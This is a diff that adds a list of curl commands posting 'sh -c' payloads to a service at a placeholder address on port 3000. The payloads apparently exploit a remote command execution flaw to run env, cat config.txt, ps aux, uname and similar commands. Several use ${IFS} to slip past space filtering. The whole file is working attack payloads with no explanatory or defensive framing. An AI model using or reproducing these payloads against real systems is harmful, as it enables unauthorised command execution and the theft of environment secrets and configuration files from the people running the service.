@@ -1,0 +1,43 @@
+curl -X POST http://<ip>:3000/ \
+  -H "Content-Type: text/plain" \
+  --data-binary $'command: "sh -c \'uname${IFS}-a\'"'
+
+curl -X POST http://<ip>:3000/ \
+  -H "Content-Type: text/plain" \
+  --data-binary $'command: "sh -c \'env\'"'
+
+curl -X POST http://<ip>:3000/ \
+  -H "Content-Type: text/plain" \
+  --data-binary $'command: "sh -c \'ls${IFS}-a${IFS}|${IFS}wc${IFS}-l\'"'
+
+curl -X POST http://<ip>:3000/ \
+  -H "Content-Type: text/plain" \
+  --data-binary $'command: "sh -c \'cat${IFS}config.txt\'"'
+
+curl -X POST http://<ip>:3000/ \
+  -H "Content-Type: text/plain" \
+  --data-binary $'command: "sh -c \'uptime\'"'
+
+curl -X POST http://<ip>:3000/ \
+  -H "Content-Type: text/plain" \
+  --data-binary $'command: "sh -c \'ps${IFS}aux\'"'
+
+curl -X POST http://<ip>:3000/ \
+  -H "Content-Type: text/plain" \
+  --data-binary $'command: "sh -c \'df${IFS}-h\'"'
+
+curl -X POST http://<ip>:3000/ \
+  -H "Content-Type: text/plain" \
+  --data-binary $'command: "sh -c \'pwd\'"'
+
+curl -X POST http://<ip>:3000/ \
+  -H "Content-Type: text/plain" \
+  --data-binary $'command: "sh -c \'ls${IFS}-l\'"'
+
+curl -X POST http://<ip>:3000/ \
+  -H "Content-Type: text/plain" \
+  --data-binary $'command: "sh -c \'ls\'"'
+
+curl -X POST http://<ip>:3000/ \
+  -H "Content-Type: text/plain" \
+  --data-binary $'command: "sh -c \'ls${IFS}-a\'"'
